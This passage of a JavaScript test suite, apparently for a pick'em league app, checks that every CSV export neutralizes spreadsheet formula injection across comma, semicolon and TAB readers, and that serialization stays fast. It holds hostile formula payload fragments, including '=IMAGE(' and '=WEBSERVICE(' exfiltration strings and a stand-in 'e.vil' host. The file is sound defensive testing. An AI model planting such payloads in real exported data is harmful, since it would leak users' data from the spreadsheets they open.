  assert(p1[header.indexOf('Alma Mater')] === "'@evil", 'the member-controlled school cell is guarded too');
  for (const [k, want] of Object.entries(EXPECT)) {
    assert(rows.some(row => row[nameIdx] === want), `the ${k} payload display name is present and guarded — ${show(want)}`);
  }
  for (const [k, [, want]] of Object.entries(PAY2)) {
    assert(rows.some(row => row[nameIdx] === want), `round 2: the ${k} display name is present and guarded — ${show(want)}`);
  }
  const q1 = rows.find(r => r[0] === 'ci_q1') || [];
  assert(q1[header.indexOf('Initials')] === ";'=1", 'round 2: `;=1` initials are guarded at the `;` field start');
  assert(q1[header.indexOf('Alma Mater')] === ';https://e.vil/?;', 'round 2: the reviewer\'s `;`-laden school (no dangerous start) is byte-identical');
  const q2 = rows.find(r => r[0] === 'ci_q2') || [];
  assert(q2[header.indexOf('Alma Mater')] === 'Smith; Jr', 'round 2: a benign `Smith; Jr` school is byte-identical');
  const bad = formulaCells(rows);
  assert(bad.length === 0, `no cell in the Players CSV would evaluate as a formula (found ${show(bad)})`);
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[5] End to end — every other export the commissioner panel binds…');
// ═════════════════════════════════════════════════════════════════════════════
{
  // Each export: the payload proven to reach it (non-vacuous), then the guard.
  const reach = {
    'export-week-picks-csv-btn':     [EXPECT.exfil, "'" + HOSTILE_TEAM, "'-MANUAL+1", PAY2.semi[1]],
    'export-week-slate-csv-btn':     ["'" + HOSTILE_TEAM, "'@mascot", "'@venue", "Big;'=1+1", "Sun\n'=A1"],
    'export-week-results-csv-btn':   [EXPECT.exfil, EXPECT.cr, PAY2.lf[1]],
    'export-week-dashboard-csv-btn': [EXPECT.exfil, EXPECT.tab, PAY2.semi[1]],
    'export-standings-csv-btn':      [EXPECT.plus, EXPECT.at, PAY2.crlf[1]],
    'export-extra-point-csv-btn':    [EXPECT.minus, PAY2.semiQuote[1]],
    'export-weekly-results-csv-btn': [EXPECT.exfil, PAY2.lfLead[1]],
    'export-obligations-csv-btn':    ["'=1+1", "'@reason", EXPECT.cr, PAY2.semi[1], "ok;'@x", 'ci_obA; ci_obB'],
    'export-feedback-csv-btn':       [EXPECT.exfil, "'" + PAY.minus, PAY2.semi[1], FB2_EXPECT],
  };
  for (const [id, expectCells] of Object.entries(reach)) {
    seedFixture();
    bindExports();
    const csv = clickOne(id);
    exportCsv[id] = csv || '';
    assert(typeof csv === 'string' && csv.length > 0, `#${id}: exactly one CSV download`);
    const rows = parseCsv(csv || '');
    const cells = allCells(rows);
    for (const want of expectCells) {
      assert(cells.includes(want), `#${id}: hostile payload reached this export and arrives guarded — ${show(want)}`);
    }
    const bad = formulaCells(rows);
    assert(bad.length === 0, `#${id}: no cell would evaluate as a formula (found ${show(bad)})`);
  }

  // Real numbers survive the guard: the signed spread stays a number.
  seedFixture(); bindExports();
  const slate = parseCsv(clickOne('export-week-slate-csv-btn') || '');
  const sh = slate[0] || [];
  const srow = slate[1] || [];
  assert(srow[sh.indexOf('Spread (home perspective)')] === '-7.5' && srow[sh.indexOf('Locked Spread')] === '-7.5',
    'Slate CSV: the signed spread -7.5 (a real number, AD-03) is NOT prefixed — stays numeric');
  seedFixture(); bindExports();
  const picks = parseCsv(clickOne('export-week-picks-csv-btn') || '');
  const ph = picks[0] || [];
  assert(picks.slice(1).every(r => r[ph.indexOf('Locked Spread')] === '-7.5'),
    'Week Picks CSV: every row\'s locked spread is the plain number -7.5');
  assert(picks.slice(1).every(r => r[ph.indexOf('Tiebreaker Guess')] && !r[ph.indexOf('Tiebreaker Guess')].startsWith("'")),
    'Week Picks CSV: tiebreaker guesses (numbers) carry no apostrophe');

  // Both bundles fan out to the same exporters on timers; collect all of them.
  for (const [id, expectFiles] of [['export-week-bundle-btn', 4], ['export-full-csv-bundle-btn', 4 + 4]]) {
    seedFixture(); bindExports();
    captured.length = 0;
    el(id)._fire('click');
    await new Promise(r => setTimeout(r, 2200));
    const files = captured.filter(c => (c.type || '').startsWith('text/csv'));
    bundleFiles[id] = files;
    assert(files.length === expectFiles, `#${id}: ${expectFiles} CSV files produced (got ${files.length})`);
    const bad = files.flatMap(f => formulaCells(parseCsv(f.text)));
    assert(bad.length === 0, `#${id}: no cell in any bundled file would evaluate as a formula (found ${bad.length})`);
    assert(files.some(f => f.text.includes("'=IMAGE(")), `#${id}: the exfil payload reached the bundle and arrives prefixed`);
  }
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[6] Structural — no CSV can bypass csvCell()…');
// ═════════════════════════════════════════════════════════════════════════════
{
  const blobSites = appJsSrc.match(/new Blob\(/g) || [];
  assert(blobSites.length === 1, `js/app.js builds a Blob in exactly ONE place (downloadFile) — got ${blobSites.length}`);
  const dl = appJsSrc.match(/function downloadFile\([^)]*\)\s*\{[\s\S]*?\n\}/);
  assert(!!dl && /new Blob\(/.test(dl[0]), 'that one Blob site is inside downloadFile()');

  // Every downloadFile(...) call that writes a .csv passes toCsv(...).
  const calls = [...appJsSrc.matchAll(/downloadFile\(([^\n]*)\);/g)].map(m => m[1]);
  const csvCalls = calls.filter(a => /\.csv`/.test(a));
  assert(csvCalls.length >= 10, `fixture check: found the CSV download calls (${csvCalls.length})`);
  const bypass = csvCalls.filter(a => !/^toCsv\(/.test(a.trim()));
  assert(bypass.length === 0, `every .csv download is toCsv(rows) — no hand-built CSV text (bypassing: ${show(bypass)})`);
  const nonCsv = calls.filter(a => !/\.csv`/.test(a));
  assert(nonCsv.every(a => /application\/json/.test(a)), 'the only non-CSV download is the JSON backup');
  // Round 2 (security test gap): the call regex above only sees SINGLE-LINE
  // calls. Every `downloadFile(` in the file must be one of those calls or the
  // one definition, so a multi-line call cannot slip past the bypass check.
  const totalDl = (appJsSrc.match(/downloadFile\(/g) || []).length;
  assert(totalDl === calls.length + 1,
    `every downloadFile( occurrence is a matched single-line call or the definition (${totalDl} occurrences vs ${calls.length} calls + 1)`);

  assert(/function toCsv\(rows\)\s*\{\s*return rows\.map\(r => r\.map\(csvCell\)/.test(appJsSrc),
    'toCsv() serializes every cell of every row (header included) through csvCell()');

  // No other shipped module builds a Blob or a text/csv payload of its own.
  const jsDir = new URL('./js/', import.meta.url);
  const others = [];
  for (const f of await readdir(jsDir)) {
    if (!f.endsWith('.js') || f === 'app.js') continue;
    const src = await readFile(new URL(f, jsDir), 'utf8');
    if (/new Blob\(|text\/csv/.test(src)) others.push(f);
  }
  assert(others.length === 0, `no other js/ module builds a Blob or a text/csv payload (${show(others)})`);
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[7] `;`-list-separator locales — every field start, every export…');
// ═════════════════════════════════════════════════════════════════════════════
{
  // ── The reader is proven to SEE the attack before it is trusted to clear it.
  const naive = s => (/[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s);
  const unguardedSemi = ['m_1', PAY2.semi[0], 'AL'].map(naive).join(',');
  assert(parseSemi(unguardedSemi).flat().some(isFormulaSemi),
    'model canary: unguarded, the finding\'s `;` payload IS a formula field to a `;`-locale reader');
  const unguardedLf = ['m_1', PAY2.lf[0], 'AL'].map(naive).join(',');
  assert(parseSemi(unguardedLf).flat().some(isFormulaSemi),
    'model canary: unguarded, an LF inside a comma-quoted mid-row cell ends the record and the next line IS a formula field');
  assert(parseSemi(['m_1', PAY.exfil].map(naive).join(','))[0].length === 1 && !parseSemi(['m_1', PAY.exfil].map(naive).join(',')).flat().some(isFormulaSemi),
    'model control: a comma-mode payload with no `;` or newline stays inside the record\'s first field');
  const q = parseSemi('"a;b\nc";d');
  assert(q.length === 1 && q[0][0] === 'a;b\nc' && q[0][1] === 'd', 'model check: a quote AT field start still qualifies the field (`;` and LF inside it are literal)');
  assert(parseSemi('x,"a;b"')[0].length === 2, 'model check: a quote MID-field is literal, so a `;` inside it still splits');
  // Round 3: the TAB-splitting reader, proven the same way.
  const unguardedTab = ['m_1', PAY2.tabMid[0], 'AL'].map(naive).join(',');
  assert(parseTab(unguardedTab).flat().some(isFormulaSemi),
    'model canary: unguarded, a mid-value TAB payload IS a formula field to a TAB-splitting reader');
  assert(!parseTab(['m_1', PAY2.tabMid[1], 'AL'].join(',')).flat().some(isFormulaSemi),
    'model control: the same value, guarded, is inert to the TAB-splitting reader');

  // ── Every export, read the `;`-locale way. Non-vacuity: a round-2 payload
  //    reached each one (its exact guarded comma-locale cell is present).
  const reach7 = {
    'export-players-csv-btn':        PAY2.semi[1],
    'export-week-picks-csv-btn':     PAY2.semi[1],
    'export-week-slate-csv-btn':     "Big;'=1+1",
    'export-week-results-csv-btn':   PAY2.lf[1],
    'export-week-dashboard-csv-btn': PAY2.semi[1],
    'export-standings-csv-btn':      PAY2.crlf[1],
    'export-extra-point-csv-btn':    PAY2.semiQuote[1],
    'export-weekly-results-csv-btn': PAY2.lfLead[1],
    'export-obligations-csv-btn':    PAY2.semi[1],
    'export-feedback-csv-btn':       FB2_EXPECT,
  };
  // The TAB payload (ci_q17, tabMid) is a display name, so it reaches every
  // export that carries names; slate and feedback carry none of the players'
  // names and are covered by the zero-formula check on their own payloads.
  const TAB_REACH = new Set(['export-players-csv-btn', 'export-week-picks-csv-btn', 'export-week-results-csv-btn',
    'export-week-dashboard-csv-btn', 'export-standings-csv-btn', 'export-extra-point-csv-btn', 'export-weekly-results-csv-btn']);
  for (const [id, want] of Object.entries(reach7)) {
    const csv = exportCsv[id] || '';
    const cells = parseCsv(csv).flat();
    assert(cells.includes(want), `#${id}: a round-2 payload reached this export — ${show(want)}`);
    const bad = parseSemi(csv).flat().filter(isFormulaSemi);
    assert(bad.length === 0, `#${id}: a \`;\`-locale reader finds ZERO formula fields (found ${show(bad)})`);
    if (TAB_REACH.has(id)) assert(cells.includes(PAY2.tabMid[1]), `#${id}: the mid-value TAB payload reached this export — ${show(PAY2.tabMid[1])}`);
    const badTab = parseTab(csv).flat().filter(isFormulaSemi);
    assert(badTab.length === 0, `#${id}: a TAB-splitting reader finds ZERO formula fields (found ${show(badTab)})`);
  }
  for (const [id, files] of Object.entries(bundleFiles)) {
    assert(files.some(f => f.text.includes("Al;'=WEBSERVICE(")), `#${id}: the \`;\` payload reached the bundle, guarded`);
    const bad = files.flatMap(f => parseSemi(f.text).flat().filter(isFormulaSemi));
    assert(bad.length === 0, `#${id}: a \`;\`-locale reader finds ZERO formula fields in any bundled file (found ${show(bad.slice(0, 3))})`);
    const badTab = files.flatMap(f => parseTab(f.text).flat().filter(isFormulaSemi));
    assert(badTab.length === 0, `#${id}: a TAB-splitting reader finds ZERO formula fields in any bundled file (found ${show(badTab.slice(0, 3))})`);
  }
}

// ═════════════════════════════════════════════════════════════════════════════
console.log('\n[8] Linear time (security F1) — long CR/LF/TAB runs serialize fast…');
// ═════════════════════════════════════════════════════════════════════════════
{
  // Round 2's separator lookahead ran `\s*`, which crosses CR/LF, so EVERY
  // newline in a run re-scanned the rest of it: quadratic (40k LFs = 1.75 s,
  // 100k ~ 11 s). A feedback `name` is uncapped, so one member row could freeze
  // the commissioner's tab on Export. Best of up to 3 runs, so a busy machine
  // does not read as a regression; a run over 500 ms is pathological, not
  // noise, and is not retried.
  const LIMIT_MS = 50;
  function bestMs(fn) {
    let best = Infinity;
    for (let i = 0; i < 3; i++) {
      const t0 = performance.now(); fn(); const t = performance.now() - t0;
      best = Math.min(best, t);
      if (best < LIMIT_MS || t > 500) break;
    }
    return best;
  }
  const N = 100000;
  const runs = [
    ['100k LF', 'x' + '\n'.repeat(N), 'the coordinator\'s case'],
    ['100k CRLF', 'x' + '\r\n'.repeat(N), 'the coordinator\'s case'],
    ['100k CR', 'x' + '\r'.repeat(N), 'CR alone is a separator too'],
    ['100k TAB', 'x' + '\t'.repeat(N), 'TAB is a separator (round 3)'],
  ];
  for (const [label, input, why] of runs) {
    let out = null;
    const ms = bestMs(() => { out = csvCell(input); });
    assert(ms < LIMIT_MS, `a ${label} cell serializes in < ${LIMIT_MS} ms (${why}) — took ${ms.toFixed(1)} ms`);
    assert(typeof out === 'string' && !out.includes("'"), `${label}: nothing dangerous follows, so no apostrophe is added (fixture check)`);
  }
  // The same runs ENDING in a formula: still linear, and exactly one guard
  // lands, after the last separator (plus the lead guard when the cell itself
  // starts with a newline).
  let lfOut = null;
  const lfMs = bestMs(() => { lfOut = csvCell('\n'.repeat(N) + '=A1'); });
  assert(lfMs < LIMIT_MS, `100k LF then "=A1" serializes in < ${LIMIT_MS} ms — took ${lfMs.toFixed(1)} ms`);
  assert(lfOut === `"'` + '\n'.repeat(N) + `'=A1"`, '100k LF then "=A1": one lead guard and one guard after the last LF, nothing in between');
  let semiOut = null;
  const semiMs = bestMs(() => { semiOut = csvCell('x' + '; '.repeat(N / 2) + '=A1'); });
  assert(semiMs < LIMIT_MS, `50k "; " then "=A1" serializes in < ${LIMIT_MS} ms — took ${semiMs.toFixed(1)} ms`);
  assert((semiOut.match(/'/g) || []).length === 1, '50k "; " then "=A1": exactly one guard, on the last `;` field');
}

console.log(`\n${'═'.repeat(50)}\n${fail === 0 ? '✅ ALL PASS' : '❌ FAILURES'} — ${pass} passed, ${fail} failed\n`);
process.exit(fail === 0 ? 0 : 1);
